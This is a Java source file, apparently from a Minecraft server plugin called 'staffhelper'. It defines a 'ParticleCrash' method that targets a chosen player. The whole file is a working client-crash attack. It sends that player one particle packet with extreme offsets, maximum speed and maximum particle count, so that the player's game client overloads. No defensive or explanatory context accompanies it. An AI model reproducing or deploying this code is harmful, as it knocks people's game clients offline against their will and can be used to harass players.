package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import org.bukkit.entity.Player;

public class ParticleCrash extends Crash {
    public ParticleCrash() {
        super(CrashMethod.PARTICLE);
    }

    @Override
    public void performCrash(Player player) {
        WrapperPlayServerParticle packet = new WrapperPlayServerParticle(
                new Particle<>(ParticleTypes.DRAGON_BREATH),
                true,
                new Vector3d(
                player.getLocation().getX(),
                player.getLocation().getY(),
                player.getLocation().getZ()),
                new Vector3f(
                999999f, 999999f, 999999f
                ),
                Float.MAX_VALUE,
                Integer.MAX_VALUE
        );
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
